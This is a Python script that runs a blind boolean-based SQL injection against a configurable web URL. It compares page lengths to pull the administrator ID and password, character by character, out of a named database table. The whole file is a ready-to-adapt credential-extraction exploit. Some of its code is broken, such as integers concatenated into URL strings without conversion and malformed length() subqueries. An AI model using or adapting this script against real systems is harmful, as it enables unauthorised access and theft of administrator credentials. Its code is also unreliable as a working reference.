# -*- coding: utf-8 -*-
"""
Created on Thu Oct 29 14:30:05 2020

@author: User
"""

import requests
DEFAULT_URL="http://127.0.0.1/"#Input Target URL
TRUE_RES=len(requests.get(DEFAULT_URL+"%27+AND+%271%27%3D%271%27+--+").text)
#TRUE_RES==different html length
KNOWN_TABLE_NAME="table_db" #Input table name

def get_admin_id():
    admin_id=''
    for admin_id_length in range(1,31): # get admin_id length
        if TRUE_RES==len(requests.get(DEFAULT_URL+"""%27and+length%28select+admin_id+from
                                     +"""+KNOWN_TABLE_NAME+"+limit+0%2C1"
                                     +"%29%3D"+admin_id_length+"+--+").text): #Input id column name
           for id_idx in range(0,admin_id_length):
               for ascii_code in range(32,127): #get one character columns name
                   if TRUE_RES==len(requests.get(DEFAULT_URL+"""%27and+ascii%28substr%28%28select+admin_id+from
                                      +"""+KNOWN_TABLE_NAME+"""+limit+0%2C1%29%2C"""+id_idx+
                                      """%2C1%29%29%3D"""+str(ascii_code)+"+--+").text):#Input id column name
                       
                       admin_id=admin_id+chr(ascii_code)
           break
    return admin_id

def get_admin_passwd():
    admin_passwd=''
    for admin_passwd_length in range(1,50): # get columns name length
        if TRUE_RES==len(requests.get(DEFAULT_URL+"""%27and+length%28select+admin_passwd+from
                                     +"""+KNOWN_TABLE_NAME+"+limit+0%2C1" #Input password column name
                                     +"%29%3D"+admin_passwd_length+"+--+").text):
           for passwd_idx in range(0,admin_passwd_length):
               for ascii_code in range(32,127): #get one character columns name
                   if TRUE_RES==len(requests.get(DEFAULT_URL+"""%27and+ascii%28substr%28%28select+admin_passwd+from
                                      +"""+KNOWN_TABLE_NAME+"""+limit+0%2C1%29%2C"""+passwd_idx+
                                      """%2C1%29%29%3D"""+str(ascii_code)+"+--+").text):#Input password column name
                       admin_passwd=admin_passwd+chr(ascii_code)
           break
    return admin_passwd


if __name__=="__main__":
    print("admin id:"+get_admin_id())
    print("admin passwd:"+get_admin_passwd())
       
               